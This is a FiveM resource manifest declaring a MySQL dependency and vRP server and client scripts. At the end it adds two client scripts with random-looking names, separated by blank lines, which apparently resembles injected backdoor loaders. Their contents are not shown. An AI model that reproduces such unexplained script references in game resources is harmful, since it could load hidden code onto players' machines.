resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

dependency "ghmattimysql"
server_scripts {
  "@vrp/lib/utils.lua",
  'server/main.lua'
}
client_scripts {
  "@vrp/client/Tunnel.lua",
	"@vrp/client/Proxy.lua",
  'client/main.lua'
}
client_script "dXKYKWpRFBlOIBufyi.lua"







client_script "13277.lua"